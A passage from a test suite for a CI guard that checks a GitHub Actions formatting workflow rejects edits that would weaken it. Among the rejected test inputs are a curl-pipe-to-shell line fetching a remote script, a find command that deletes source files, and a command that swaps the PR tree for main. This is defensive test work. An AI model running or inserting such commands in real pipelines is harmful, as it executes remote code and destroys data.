        "          version: '10.15.0'\n          run_install: false\n          standalone: true\n",
        'the pnpm/action-setup inputs',
      ),
    )
    expect(r.ok, r.message).toBe(true)
  })

  it('fires on the shipped workflow when its checkout is pointed at `main`', () => {
    const shipped = readFileSync(FORMAT_WORKFLOW, 'utf-8')
    const r = checkFormatWorkflow(withInputs(shipped, '          ref: main\n'))
    expect(r.ok).toBe(false)
    expect(r.message).toContain('`ref`')
  })

  it('stays green on the shipped workflow when its checkout gains `fetch-depth: 0`', () => {
    const shipped = readFileSync(FORMAT_WORKFLOW, 'utf-8')
    const r = checkFormatWorkflow(withInputs(shipped, '          fetch-depth: 0\n'))
    expect(r.ok, r.message).toBe(true)
  })
})

// The command equality reads only the `run:` text. `working-directory:` is `cd` spelled
// as a key, and `defaults.run.working-directory` is the same `cd` one level up (job) or
// two (workflow) — each makes CI run `pnpm format:check` inside a package, i.e. that
// package's OWN `format:check`. Measured (pnpm, the real producer): today no workspace
// package declares the script, so `cd packages/dev-tools && pnpm format:check` exits 254
// (ERR_PNPM_NO_SCRIPT) — fail-closed by accident; a package.json carrying
// `"format:check": "echo SUBSET-ONLY"` runs it, exit 0. The first package to gain that
// script turns the accident into a silent subset with this guard green — AC4's divergence
// reinstated through a key the `--filter=`/`cd` rule was written to catch.
describe('the checking step runs in the repository root, carrying only the keys it needs (#413)', () => {
  const CHECK =
    '      - name: Check formatting\n        id: format_check\n        run: pnpm format:check\n'
  const RUN = '        run: pnpm format:check\n'
  const checkWith = (source: string, key: string) =>
    mutate(source, CHECK, CHECK.replace(RUN, `${key}${RUN}`), 'the checking step')

  const foreignKeys: [string, string, string][] = [
    [
      '`working-directory:`',
      '        working-directory: packages/dev-tools\n',
      'working-directory',
    ],
    ['`shell:`', '        shell: bash\n', 'shell'],
    ['`env:`', '        env:\n          NODE_OPTIONS: --max-old-space-size=4096\n', 'env'],
    [
      '`with:` (meaningless on a `run:` step, and not needed)',
      '        with:\n          x: y\n',
      'with',
    ],
  ]

  for (const [label, key, name] of foreignKeys) {
    it(`fails when the checking step carries ${label}`, () => {
      const r = checkFormatWorkflow(checkWith(WELL_FORMED, key))
      expect(r.ok, `${key}: ${r.message}`).toBe(false)
      expect(r.message, key).toContain(`\`${name}`)
      expect(r.message, key).toContain('may carry only')
    })
  }

  it('accepts `timeout-minutes:` on the checking step', () => {
    const r = checkFormatWorkflow(checkWith(WELL_FORMED, '        timeout-minutes: 5\n'))
    expect(r.ok, r.message).toBe(true)
  })

  // `if:` and `continue-on-error:` on that step are owned by their own rules, which
  // name the loss precisely; this rule stays silent on them rather than reporting a
  // second, vaguer cause.
  it('leaves `if:` and `continue-on-error:` on the checking step to their own rules', () => {
    for (const key of [
      "        if: github.event_name == 'push'\n",
      '        continue-on-error: true\n',
    ]) {
      const r = checkFormatWorkflow(checkWith(WELL_FORMED, key))
      expect(r.ok, key).toBe(false)
      expect(r.message, key).not.toContain('may carry only')
    }
  })

  const JOB = '  format:\n    runs-on: ubuntu-latest\n'

  it('fails on `defaults:` on the host job, in either spelling', () => {
    for (const defaults of [
      '    defaults:\n      run:\n        working-directory: packages/dev-tools\n',
      '    defaults:\n      run:\n        shell: bash\n',
    ]) {
      const r = checkFormatWorkflow(mutate(WELL_FORMED, JOB, `${JOB}${defaults}`, 'the host job'))
      expect(r.ok, `${defaults}: ${r.message}`).toBe(false)
      expect(r.message, defaults).toContain('defaults')
    }
  })

  it('fails on a workflow-level `defaults:`', () => {
    const r = checkFormatWorkflow(
      mutate(
        WELL_FORMED,
        '\njobs:\n',
        '\ndefaults:\n  run:\n    working-directory: packages/dev-tools\n\njobs:\n',
        'the jobs key',
      ),
    )
    expect(r.ok, r.message).toBe(false)
    expect(r.message).toContain('defaults')
  })

  it('fires on the shipped workflow when the checking step gains a `working-directory:`', () => {
    const shipped = readFileSync(FORMAT_WORKFLOW, 'utf-8')
    const r = checkFormatWorkflow(
      checkWith(shipped, '        working-directory: packages/dev-tools\n'),
    )
    expect(r.ok).toBe(false)
    expect(r.message).toContain('working-directory')
  })

  it('fires on the shipped workflow when the host job gains `defaults:`', () => {
    const shipped = readFileSync(FORMAT_WORKFLOW, 'utf-8')
    const r = checkFormatWorkflow(
      mutate(
        shipped,
        JOB,
        `${JOB}    defaults:\n      run:\n        working-directory: packages/dev-tools\n`,
        'the host job',
      ),
    )
    expect(r.ok).toBe(false)
    expect(r.message).toContain('defaults')
  })
})

// The rule's own comment said a substring test for `pull_request` was not enough — and
// `CANCEL_ON_PULL_REQUEST` was itself an unanchored substring over the value. Measured
// on GitHub (probe run on this PR, see the working log), evaluated on a pull_request
// event: `!(github.event_name == 'pull_request')` → false, `github.event_name ==
// 'pull_request' && false` → false, `github.event_name == 'pull_request' || true` → true.
// The first two cancel nothing on a PR (stale verdicts, superseded runs keep burning
// runners); the third cancels on `main` too, so two merges a minute apart leave the first
// commit with no formatting verdict (AC7). The accepted spelling is anchored to the WHOLE
// value.
describe('cancel-in-progress is an anchored allow-list, not a substring (#413)', () => {
  const cancelOf = (source: string, value: string) =>
    mutate(source, 'cancel-in-progress: true', `cancel-in-progress: ${value}`, 'cancel-in-progress')

  const rejected: string[] = [
    "${{ !(github.event_name == 'pull_request') }}",
    "${{ github.event_name == 'pull_request' && false }}",
    "${{ github.event_name == 'pull_request' || true }}",
    "${{ github.event_name == 'push' }}",
    "${{ github.event_name == 'pull_request' }}-x",
    "${{ contains(github.event_name, 'pull_request') }}",
    '${{ true }}',
  ]

  for (const value of rejected) {
    it(`fails on \`cancel-in-progress: ${value}\``, () => {
      const r = checkFormatWorkflow(cancelOf(WELL_FORMED, value))
      expect(r.ok, `${value}: ${r.message}`).toBe(false)
      expect(r.message, value).toContain('cancel-in-progress')
    })
  }

  const accepted: string[] = [
    "${{ github.event_name == 'pull_request' }}",
    "${{ 'pull_request' == github.event_name }}",
    '${{ github.event_name == "pull_request" }}',
    '"${{ github.event_name == \'pull_request\' }}"',
    "${{github.event_name=='pull_request'}}",
    'true',
  ]

  for (const value of accepted) {
    it(`accepts \`cancel-in-progress: ${value}\``, () => {
      const r = checkFormatWorkflow(cancelOf(WELL_FORMED, value))
      expect(r.ok, `${value}: ${r.message}`).toBe(true)
    })
  }

  it('fires on the shipped workflow when the PR equality is negated as a group', () => {
    const shipped = readFileSync(FORMAT_WORKFLOW, 'utf-8')
    const r = checkFormatWorkflow(
      mutate(
        shipped,
        "cancel-in-progress: ${{ github.event_name == 'pull_request' }}",
        "cancel-in-progress: ${{ !(github.event_name == 'pull_request') }}",
        'the shipped cancel-in-progress',
      ),
    )
    expect(r.ok).toBe(false)
    expect(r.message).toContain('cancel-in-progress')
  })
})

// Round 11, carried forward. `GROUP_KEYED_ON_REF` was a substring test too: a group that
// CONTAINS `github.ref` and also `github.run_id` (or `sha`, `run_number`) is unique per
// run, so nothing is ever superseded — the "concurrency dropped" loss with the block still
// present. And a bare `${{ github.ref }}` with no workflow-distinguishing prefix shares
// its group with any other workflow keyed the same way (latent today; one token from a
// cross-workflow cancel). The accepted shape is `<prefix>-<ref key>`, anchored.
describe('the concurrency group is a prefixed ref key and nothing more (#413)', () => {
  const GROUP = 'group: format-${{ github.ref }}'
  const groupOf = (source: string, value: string) =>
    mutate(source, GROUP, `group: ${value}`, 'the concurrency group')

  const unique: string[] = [
    'format-${{ github.run_id }}-${{ github.ref }}',
    'format-${{ github.ref }}-${{ github.sha }}',
    'format-${{ github.ref }}-${{ github.run_number }}',
    'format-${{ github.ref }}-${{ github.run_attempt }}',
  ]

  for (const value of unique) {
    it(`fails on \`group: ${value}\`, unique per run so nothing supersedes`, () => {
      const r = checkFormatWorkflow(groupOf(WELL_FORMED, value))
      expect(r.ok, `${value}: ${r.message}`).toBe(false)
      expect(r.message, value).toContain('github.ref')
    })
  }

  it('fails on a bare `${{ github.ref }}` with no workflow-distinguishing prefix', () => {
    const r = checkFormatWorkflow(groupOf(WELL_FORMED, '${{ github.ref }}'))
    expect(r.ok, r.message).toBe(false)
    expect(r.message).toContain('prefix')
  })

  it('fires on the shipped workflow when the group gains a per-run token', () => {
    const shipped = readFileSync(FORMAT_WORKFLOW, 'utf-8')
    const r = checkFormatWorkflow(groupOf(shipped, 'format-${{ github.run_id }}-${{ github.ref }}'))
    expect(r.ok).toBe(false)
    expect(r.message).toContain('github.ref')
  })
})

// Two VALID spellings the reader could not follow were reported as a DIFFERENT, false
// problem. (a) An indentless block sequence — YAML permits `- ` at the parent key's
// indent, and `yaml@2.8.2` parses `branches:\n- main` and `branches:\n  - main` to the
// same value (measured); GitHub honours it (probe run on this PR, see the working log).
// `pnpm format:check` runs prettier over ts/tsx/js/jsx/json/html only, so nothing in this
// repo normalizes YAML indentation and an editor default produces exactly this shape.
// It was reported as "does not cover `main` (no branch)" / "no failure-path step names the
// remedy". (b) `branches: *shared` was reported as the same "no branch", while the ADL
// states aliases are rejected anywhere with a message naming the spelling. A guard that
// names the wrong cause on a correct workflow is the kind that gets weakened.
describe('an indentless block sequence is read, and an alias is named as one (#413)', () => {
  /** Every `steps:` item and its body moved two columns left — the indentless spelling. */
  function indentlessSteps(source: string): string {
    const out: string[] = []
    let inSteps = false
    for (const line of source.split('\n')) {
      if (/^ {4}steps:\s*$/.test(line)) {
        inSteps = true
        out.push(line)
        continue
      }
      if (inSteps && line.trim() !== '' && line.length - line.trimStart().length <= 4) {
        inSteps = false
      }
      out.push(inSteps && line.startsWith('      ') ? line.slice(2) : line)
    }
    expect(out.join('\n'), 'the steps did not move').not.toBe(source)
    return out.join('\n')
  }

  const indentlessBranches = (source: string) =>
    mutate(source, /^ {6}- main$/gm, '    - main', 'the indented branch items')

  it('accepts indentless `branches:` items on both triggers', () => {
    const r = checkFormatWorkflow(indentlessBranches(WELL_FORMED))
    expect(r.ok, r.message).toBe(true)
  })

  it('accepts indentless `steps:` items', () => {
    const r = checkFormatWorkflow(indentlessSteps(WELL_FORMED))
    expect(r.ok, r.message).toBe(true)
  })

  it('accepts the shipped workflow with both sequences written indentless', () => {
    const shipped = readFileSync(FORMAT_WORKFLOW, 'utf-8')
    const r = checkFormatWorkflow(indentlessSteps(indentlessBranches(shipped)))
    expect(r.ok, r.message).toBe(true)
  })

  it('accepts indentless `types:` items that keep opened and synchronize', () => {
    const r = checkFormatWorkflow(
      mutate(
        WELL_FORMED,
        '  pull_request:\n    branches:\n      - main\n',
        '  pull_request:\n    branches:\n      - main\n    types:\n    - opened\n    - synchronize\n    - reopened\n',
        'the pull_request trigger',
      ),
    )
    expect(r.ok, r.message).toBe(true)
  })

  // Read, not merely tolerated: the rules see through the spelling to the real cause.
  it('reads an indentless branch filter that misses `main` and names THAT cause', () => {
    const r = checkFormatWorkflow(
      mutate(
        WELL_FORMED,
        '  pull_request:\n    branches:\n      - main\n',
        '  pull_request:\n    branches:\n    - release\n',
        'the pull_request branch filter',
      ),
    )
    expect(r.ok).toBe(false)
    expect(r.message).toContain('does not cover `main` (release)')
  })

  it('reads an indentless `types:` narrowing and names THAT cause', () => {
    const r = checkFormatWorkflow(
      mutate(
        WELL_FORMED,
        '  pull_request:\n    branches:\n      - main\n',
        '  pull_request:\n    branches:\n      - main\n    types:\n    - closed\n',
        'the pull_request trigger',
      ),
    )
    expect(r.ok).toBe(false)
    expect(r.message).toContain('dropping opened, synchronize')
  })

  it('follows indentless steps into the write-mode scan', () => {
    const r = checkFormatWorkflow(
      indentlessSteps(WELL_FORMED).replace(
        '    - name: Check formatting\n',
        '    - name: Fix\n      run: npx prettier --write .\n    - name: Check formatting\n',
      ),
    )
    expect(r.ok).toBe(false)
    expect(r.message).toContain('prettier --write')
  })

  it('follows indentless steps into the `uses:` allow-list', () => {
    const r = checkFormatWorkflow(
      indentlessSteps(WELL_FORMED).replace(
        '    - name: Check formatting\n',
        '    - name: Fix\n      uses: creyD/prettier_action@v4\n    - name: Check formatting\n',
      ),
    )
    expect(r.ok).toBe(false)
    expect(r.message).toContain('uses:')
  })

  it('reads an indentless `needs:` list and rejects it as `needs:`', () => {
    const r = checkFormatWorkflow(
      mutate(
        WELL_FORMED,
        '  format:\n    runs-on: ubuntu-latest\n',
        '  precheck:\n    runs-on: ubuntu-latest\n    steps:\n    - run: exit 1\n  format:\n    needs:\n    - precheck\n    runs-on: ubuntu-latest\n',
        'the host job',
      ),
    )
    expect(r.ok).toBe(false)
    expect(r.message).toContain('needs: precheck')
  })

  // `on:` as a LIST of events is valid YAML and a valid workflow, and it carries NO
  // filter — every branch, GitHub's default activity types — which is a SUPERSET of what
  // this guard requires. Read, therefore, not rejected; what is still RED is a list that
  // drops an EVENT.
  it('accepts `on:` written as an event list', () => {
    const r = checkFormatWorkflow(
      mutate(
        WELL_FORMED,
        'on:\n  pull_request:\n    branches:\n      - main\n  push:\n    branches:\n      - main\n',
        'on:\n- pull_request\n- push\n',
        'the on block',
      ),
    )
    expect(r.ok, r.message).toBe(true)
  })

  it('reads an event list that drops `push` and names THAT cause', () => {
    const r = checkFormatWorkflow(
      mutate(
        WELL_FORMED,
        'on:\n  pull_request:\n    branches:\n      - main\n  push:\n    branches:\n      - main\n',
        'on:\n- pull_request\n',
        'the on block',
      ),
    )
    expect(r.ok).toBe(false)
    expect(r.message).toContain('has no `push` trigger')
  })

  it('reads a scalar `on: pull_request` and names the missing `push`', () => {
    const r = checkFormatWorkflow(
      mutate(
        WELL_FORMED,
        'on:\n  pull_request:\n    branches:\n      - main\n  push:\n    branches:\n      - main\n',
        'on: pull_request\n',
        'the on block',
      ),
    )
    expect(r.ok).toBe(false)
    expect(r.message).toContain('has no `push` trigger')
  })
})

// (b) An ANCHOR names a node; an ALIAS is that node. GitHub resolves both — measured on
// PR #477, probe run 33724282535: a workflow whose `push.branches` is `*b`, anchored on
// `pull_request.branches`, RAN on a push to that branch — so a guard that reported the
// alias as an unreadable spelling was reporting a CORRECT workflow red. The parser
// resolves them and the semantic rule decides on the resolved value. Rows are the
// decision table over that domain: the same key, aliased to a value that is fine, and
// aliased to a value that is a hole.
describe('an alias resolves to the value it names, and the rule decides (#413)', () => {
  const aliased: [string, string, string, string | null][] = [
    [
      '`branches: *shared` anchored on a filter that names `main`',
      '  pull_request:\n    branches:\n      - main\n  push:\n    branches:\n      - main\n',
      '  pull_request:\n    branches: &shared\n      - main\n  push:\n    branches: *shared\n',
      null,
    ],
    [
      '`branches: *shared` anchored on a filter that misses `main`',
      '  pull_request:\n    branches:\n      - main\n  push:\n    branches:\n      - main\n',
      '  pull_request:\n    branches: &shared\n      - release\n  push:\n    branches: *shared\n',
      'does not cover `main` (release)',
    ],
    [
      '`types:` narrowed through an anchored/aliased list item',
      '  pull_request:\n    branches:\n      - main\n',
      '  pull_request:\n    branches:\n      - main\n    types: [&t closed, *t]\n',
      'dropping opened, synchronize',
    ],
    [
      '`tags: *tags` with no `branches:` beside it',
      '  push:\n    branches:\n      - main\n',
      "  push:\n    tags: &tags\n      - 'v*'\n",
      'never runs on a push to any branch',
    ],
    [
      '`needs: *deps` anchored on a job list',
      '  format:\n    runs-on: ubuntu-latest\n',
      '  precheck:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Gate\n        run: pnpm install\n  format:\n    needs: &deps\n      - precheck\n    runs-on: ubuntu-latest\n',
      'needs: precheck',
    ],
    [
      '`permissions: *perms` anchored on a WRITE scope',
      '    permissions:\n      contents: read\n',
      '    permissions: &perms\n      contents: write\n',
      'WRITE',
    ],
    [
      '`group: *group` anchored on a constant',
      'concurrency:\n  group: format-${{ github.ref }}\n',
      'concurrency:\n  group: &group format\n',
      'github.ref',
    ],
    [
      '`cancel-in-progress: *cancel` anchored on `true`',
      'concurrency:\n  group: format-${{ github.ref }}\n  cancel-in-progress: true\n',
      'concurrency:\n  group: format-${{ github.ref }}\n  cancel-in-progress: &cancel true\n',
      null,
    ],
    [
      'an anchor on a value (`group: &g format-${{ github.ref }}`)',
      'group: format-${{ github.ref }}',
      'group: &g format-${{ github.ref }}',
      null,
    ],
    [
      'an anchored trigger key (`pull_request: &filters`)',
      '  pull_request:\n',
      '  pull_request: &filters\n',
      null,
    ],
  ]

  for (const [label, from, to, cause] of aliased) {
    it(`${cause === null ? 'accepts' : 'fails on'} ${label}`, () => {
      const r = checkFormatWorkflow(mutate(WELL_FORMED, from, to, label))
      if (cause === null) {
        expect(r.ok, `${label}: ${r.message}`).toBe(true)
        return
      }
      expect(r.ok, `${label}: ${r.message}`).toBe(false)
      expect(r.message, label).toContain(cause)
    })
  }

  // An aliased STEP is a whole step the write-mode scan used to lose. The parser puts it
  // back, so the alias is scanned exactly like the node it names.
  it('follows an aliased step into the write-mode scan', () => {
    const r = checkFormatWorkflow(
      mutate(
        WELL_FORMED,
        '      - name: Check formatting\n',
        '      - &fixer\n        name: Fix\n        run: npx prettier --write .\n      - *fixer\n      - name: Check formatting\n',
        'the checking step',
      ),
    )
    expect(r.ok).toBe(false)
    expect(r.message).toContain('prettier --write')
  })

  it('accepts an aliased step that is an allow-listed one', () => {
    const r = checkFormatWorkflow(
      mutate(
        WELL_FORMED,
        '      - name: Checkout code\n        uses: actions/checkout@v4\n',
        '      - &checkout\n        name: Checkout code\n        uses: actions/checkout@v4\n      - *checkout\n',
        'the checkout step',
      ),
    )
    expect(r.ok, r.message).toBe(true)
  })

  // Shell is not YAML: the parser hands a `run:` body over as a string, so a `*` at the
  // start of a line inside it (a `case` pattern, a glob) is never an alias.
  it('leaves a `*` inside a run block scalar alone', () => {
    const r = checkFormatWorkflow(
      mutate(
        WELL_FORMED,
        `        run: echo "::error::Not formatted. Run 'pnpm format' locally and commit the result."\n`,
        `        run: |\n          echo "::error::Not formatted. Run 'pnpm format' locally and commit the result."\n          echo "* and & are shell here, not YAML."\n`,
        'the remedy step',
      ),
    )
    expect(r.ok, r.message).toBe(true)
  })
})

// Round 13. Every OTHER surface of the workflow is an allow-list; the shell of the
// non-check, non-remedy steps was the one deny-list left (write-mode formatters, `${{`,
// `secrets.`). Measured on the shipped file: `- name: Sync / run: git fetch origin main &&
// git checkout origin/main -- .` before `Check formatting` → ok=true; `run: pnpm install
// && find . -name '*.ts' -not -path './node_modules/*' -delete` → ok=true. Both make
// `pnpm format:check` run on a tree that is not the PR's — the identical AC2 loss measured
// with `with: ref: main` (run 33635537234) and closed by an allow-list there — spelled in
// shell, where no formatter list can name it. The workflow has exactly two such commands:
// `pnpm install` (flags only) and the corepack fallback.
describe('a step outside the check and its remedy runs only the toolchain install (#413)', () => {
  const CHECK = '      - name: Check formatting\n'
  const INSTALL = '      - name: Install dependencies\n        run: pnpm install\n'
  const before = (source: string, step: string) =>
    mutate(source, CHECK, `${step}${CHECK}`, 'the checking step')
  const install = (source: string, run: string) =>
    mutate(
      source,
      INSTALL,
      `      - name: Install dependencies\n        run: ${run}\n`,
      'the install step',
    )

  const foreign: [string, (source: string) => string, string][] = [
    [
      'a sync step that replaces the PR tree with `main`',
      source =>
        before(
          source,
          '      - name: Sync\n        run: git fetch origin main && git checkout origin/main -- .\n',
        ),
      'git checkout origin/main -- .',
    ],
    [
      'an install line that deletes files afterwards',
      source =>
        install(
          source,
          "pnpm install && find . -name '*.ts' -not -path './node_modules/*' -delete",
        ),
      '-delete',
    ],
    [
      'an install followed by a second command on the same line',
      source => install(source, 'pnpm install; git checkout origin/main -- .'),
      'git checkout',
    ],
    [
      'an install with a positional argument (`pnpm install <pkg>` edits package.json)',
      source => install(source, 'pnpm install left-pad'),
      'left-pad',
    ],
    [
      'a bare echo (unquoted words are not an inert message)',
      source => before(source, '      - name: Say hello\n        run: echo hello\n'),
      'echo hello',
    ],
    [
      'a block scalar whose lines are not all toolchain commands',
      source =>
        install(
          source,
          '|\n          pnpm install\n          curl -sSf https://example.com/fix.sh | sh',
        ),
      'curl',
    ],
    [
      'an unconditional step AFTER the check (position does not license it)',
      source =>
        mutate(
          source,
          '      - name: Explain how to fix it\n',
          '      - name: Tests\n        run: pnpm test\n      - name: Explain how to fix it\n',
          'the remedy step',
        ),
      'pnpm test',
    ],
    [
      'a step in a second job',
      source =>
        mutate(
          source,
          '\njobs:\n',
          '\njobs:\n  other:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: read\n    steps:\n      - run: git checkout origin/main -- .\n',
          'the jobs key',
        ),
      'git checkout',
    ],
  ]

  for (const [label, edit, needle] of foreign) {
    it(`fails on ${label}`, () => {
      const r = checkFormatWorkflow(edit(WELL_FORMED))
      expect(r.ok, r.message).toBe(false)
      expect(r.message).toContain(needle)
      expect(r.message).toContain('toolchain install')
    })
  }

  // The message names the loss in its shell spelling, whichever foreign command fired.
  it('names `git checkout origin/main -- .` and `find … -delete` as the loss', () => {
    const r = checkFormatWorkflow(install(WELL_FORMED, 'pnpm test'))
    expect(r.ok).toBe(false)
    expect(r.message).toContain('git checkout origin/main -- .')
    expect(r.message).toContain('-delete')
    expect(r.message).toContain('AC2')
  })

  // The two commands the workflow has, in every spelling this repo uses or may need.
  const toolchain: [string, string][] = [
    ['`pnpm install` with a flag', 'pnpm install --frozen-lockfile'],
    [
      '`pnpm install` with several flags, one valued',
      'pnpm install --prefer-offline --reporter=append-only',
    ],
    [
      'the corepack fallback block, as shipped',
      [
        '|',
        '          if ! command -v pnpm >/dev/null 2>&1; then',
        '            echo "pnpm not found in PATH; attempting to enable via corepack"',
        '            corepack enable || true',
        '            corepack prepare pnpm@10.15.0 --activate || true',
        '          fi',
      ].join('\n'),
    ],
    ['`corepack enable` alone', 'corepack enable'],
    ['`corepack prepare` without the `|| true`', 'corepack prepare pnpm@10.15.0 --activate'],
    ['a trailing shell comment on the install line', 'pnpm install # frozen by CI=true'],
  ]

  for (const [label, run] of toolchain) {
    it(`accepts ${label}`, () => {
      const r = checkFormatWorkflow(install(WELL_FORMED, run))
      expect(r.ok, r.message).toBe(true)
    })
  }

  // Allow-listing the toolchain does not retire the write scan: a write-mode formatter on
  // the install line is reported as BOTH — the reader learns the formatter, not only "foreign".
  it('still names a write-mode formatter beside the toolchain rejection', () => {
    const r = checkFormatWorkflow(install(WELL_FORMED, 'pnpm install && npx prettier --write .'))
    expect(r.ok).toBe(false)
    expect(r.message).toContain('prettier --write')
    expect(r.message).toContain('toolchain install')
  })

  // The remedy's shell stays deny-list scanned (it runs after the check, on the failure
  // path): its message may say what it needs to.
  it('leaves the remedy step outside the TOOLCHAIN allow-list (it has its own)', () => {
    const r = checkFormatWorkflow(
      mutate(
        WELL_FORMED,
        `        run: echo "::error::Not formatted. Run 'pnpm format' locally and commit the result."\n`,
        `        run: |\n          echo "::error::Not formatted. Run 'pnpm format' locally."\n          echo "See the step above for the files."\n`,
        'the remedy step',
      ),
    )
    expect(r.ok, r.message).toBe(true)
  })

  // The two reviewer probes, on the SHIPPED file.
  it('fires on the shipped workflow when a sync step precedes the check', () => {
    const shipped = readFileSync(FORMAT_WORKFLOW, 'utf-8')
    const r = checkFormatWorkflow(
      before(
        shipped,
        '      - name: Sync\n        run: git fetch origin main && git checkout origin/main -- .\n',
      ),
    )
    expect(r.ok).toBe(false)
    expect(r.message).toContain('git checkout origin/main -- .')
  })

  it('fires on the shipped workflow when the install line deletes files', () => {
    const shipped = readFileSync(FORMAT_WORKFLOW, 'utf-8')
    const r = checkFormatWorkflow(
      install(shipped, "pnpm install && find . -name '*.ts' -not -path './node_modules/*' -delete"),
    )
    expect(r.ok).toBe(false)
    expect(r.message).toContain('-delete')
  })
})

// `-w` is prettier's documented short form of `--write` (`prettier --help`: "-w, --write
// Edit files in-place"). Measured: `run: pnpm install && npx prettier -w .` → ok=true while
// `--write` was red — the one list the AC6 ban reuses had the long spelling only.
describe('prettier `-w` is `--write` (#413)', () => {
  const INSTALL = '      - name: Install dependencies\n        run: pnpm install\n'

  it('fails on `npx prettier -w .` in the install step, naming the formatter', () => {
    const r = checkFormatWorkflow(
      mutate(
        WELL_FORMED,
        INSTALL,
        '      - name: Install dependencies\n        run: pnpm install && npx prettier -w .\n',
        'the install step',
      ),
    )
    expect(r.ok).toBe(false)
    expect(r.message).toContain('prettier --write')
  })

  it('fails on `prettier -w` in the remedy step too, where no allow-list applies', () => {
    const r = checkFormatWorkflow(
      mutate(
        WELL_FORMED,
        `        run: echo "::error::Not formatted. Run 'pnpm format' locally and commit the result."\n`,
        `        run: npx prettier -w . && echo "::error::Not formatted. Run 'pnpm format' locally."\n`,
        'the remedy step',
      ),
    )
    expect(r.ok).toBe(false)
    expect(r.message).toContain('prettier --write')
  })

  it('fires on the shipped workflow', () => {
    const shipped = readFileSync(FORMAT_WORKFLOW, 'utf-8')
    const r = checkFormatWorkflow(
      mutate(
        shipped,
        INSTALL,
        '      - name: Install dependencies\n        run: pnpm install && npx prettier -w .\n',
        'the install step',
      ),
    )
    expect(r.ok).toBe(false)
    expect(r.message).toContain('prettier --write')
  })
})

// Three reader-incompleteness false-fails on CORRECT workflows (the failure class ADL
// 2026-09-01-workflow-guard-rejects-what-it-cannot-read names as the parser flip trigger).
// Each is a spelling GitHub resolves identically to the shipped one — measured on run
// 33676806439 (probe C on PR #477): `run: "pnpm format:check"` logged as `Run pnpm
// format:check`; the whole file with CRLF line endings parsed and ran; workflow-level
// `permissions:` was INHERITED by a job without its own (token: Contents+Issues: read) and
// REPLACED by the job with its own (token: Contents: read only).
describe('a quoted `run:` scalar, CRLF line endings and workflow-level permissions are read (#413)', () => {
  const CHECK_RUN = '        run: pnpm format:check\n'

  it('accepts `run: "pnpm format:check"` (double-quoted YAML scalar)', () => {
    const r = checkFormatWorkflow(
      mutate(WELL_FORMED, CHECK_RUN, '        run: "pnpm format:check"\n'),
    )
    expect(r.ok, r.message).toBe(true)
  })

  it("accepts `run: 'pnpm format:check'` (single-quoted)", () => {
    const r = checkFormatWorkflow(
      mutate(WELL_FORMED, CHECK_RUN, "        run: 'pnpm format:check'\n"),
    )
    expect(r.ok, r.message).toBe(true)
  })

  it('still rejects a quoted command that is not THE command', () => {
    const r = checkFormatWorkflow(
      mutate(WELL_FORMED, CHECK_RUN, '        run: "pnpm format:check --filter=@pair/website"\n'),
    )
    expect(r.ok).toBe(false)
    expect(r.message).toContain('not `pnpm format:check`')
  })

  // The same quoted scalar on the INSTALL step. yaml@2.8.2 (the catalog entry) parses
  // `run: "pnpm install"` and `run: 'pnpm install'` to the string `pnpm install`; GitHub
  // resolves them the same way (run 33676806439). Round 13 unquoted the check command
  // but not the setup allow-list, so a correct spelling was red with a misleading cause
  // ("runs `"pnpm install"`: … the only shell this workflow runs is the toolchain install").
  const INSTALL_RUN = '        run: pnpm install\n'
  const quotedInstall: [string, string][] = [
    ['`run: "pnpm install"` (double-quoted)', '        run: "pnpm install"\n'],
    ["`run: 'pnpm install'` (single-quoted)", "        run: 'pnpm install'\n"],
    ['a quoted install with a flag', '        run: "pnpm install --frozen-lockfile"\n'],
  ]

  for (const [label, run] of quotedInstall) {
    it(`accepts ${label} on the install step`, () => {
      const r = checkFormatWorkflow(mutate(WELL_FORMED, INSTALL_RUN, run, 'the install run'))
      expect(r.ok, r.message).toBe(true)
    })
  }

  it('accepts the shipped workflow with its install line quoted', () => {
    const shipped = readFileSync(FORMAT_WORKFLOW, 'utf-8')
    const r = checkFormatWorkflow(mutate(shipped, INSTALL_RUN, '        run: "pnpm install"\n'))
    expect(r.ok, r.message).toBe(true)
  })

  // Quotes do not launder a foreign command: what is inside them is still read.
  it('still rejects a quoted install with a positional argument', () => {
    const r = checkFormatWorkflow(
      mutate(WELL_FORMED, INSTALL_RUN, '        run: "pnpm install left-pad"\n', 'the install run'),
    )
    expect(r.ok).toBe(false)
    expect(r.message).toContain('pnpm install left-pad')
    expect(r.message).toContain('toolchain install')
  })

  it('still rejects a quoted install chained to a tree rewrite', () => {
    const r = checkFormatWorkflow(
      mutate(
        WELL_FORMED,
        INSTALL_RUN,
        '        run: "pnpm install && git checkout origin/main -- ."\n',
        'the install run',
      ),
    )
    expect(r.ok).toBe(false)
    expect(r.message).toContain('git checkout origin/main -- .')
    expect(r.message).toContain('toolchain install')
  })

  it('accepts the well-formed workflow with CRLF line endings', () => {
    const crlf = WELL_FORMED.replace(/\n/g, '\r\n')
    expect(crlf).toContain('\r\n')
    const r = checkFormatWorkflow(crlf)
    expect(r.ok, r.message).toBe(true)
  })

  it('still sees a hole through CRLF line endings', () => {
    const r = checkFormatWorkflow(
      mutate(
        WELL_FORMED,
        '  push:\n    branches:',
        '  push:\n    paths-ignore:\n      - .changeset/**\n    branches:',
        'the push trigger',
      ).replace(/\n/g, '\r\n'),
    )
    expect(r.ok).toBe(false)
    expect(r.message).toContain('paths-ignore')
    expect(r.message).not.toContain('list of events')
  })

  const JOB_PERMISSIONS = '    permissions:\n      contents: read\n'
  const atWorkflowLevel = (source: string, scope: string, job: string | null) => {
    const withoutJob = mutate(source, JOB_PERMISSIONS, job ?? '', 'the job permissions')
    return mutate(withoutJob, '\njobs:\n', `\npermissions:\n${scope}\njobs:\n`, 'the jobs key')
  }

  it('accepts `permissions: contents: read` at workflow level with none on the job', () => {
    const r = checkFormatWorkflow(atWorkflowLevel(WELL_FORMED, '  contents: read\n', null))
    expect(r.ok, r.message).toBe(true)
  })

  it('accepts `permissions: read-all` at workflow level', () => {
    const r = checkFormatWorkflow(
      mutate(
        mutate(WELL_FORMED, JOB_PERMISSIONS, '', 'the job permissions'),
        '\njobs:\n',
        '\npermissions: read-all\n\njobs:\n',
        'the jobs key',
      ),
    )
    expect(r.ok, r.message).toBe(true)
  })

  it('rejects a WRITE scope at workflow level inherited by the job, naming the level', () => {
    const r = checkFormatWorkflow(atWorkflowLevel(WELL_FORMED, '  contents: write\n', null))
    expect(r.ok).toBe(false)
    expect(r.message).toContain('WRITE')
    expect(r.message).toContain('workflow-level')
  })

  it('rejects `permissions: write-all` at workflow level', () => {
    const r = checkFormatWorkflow(
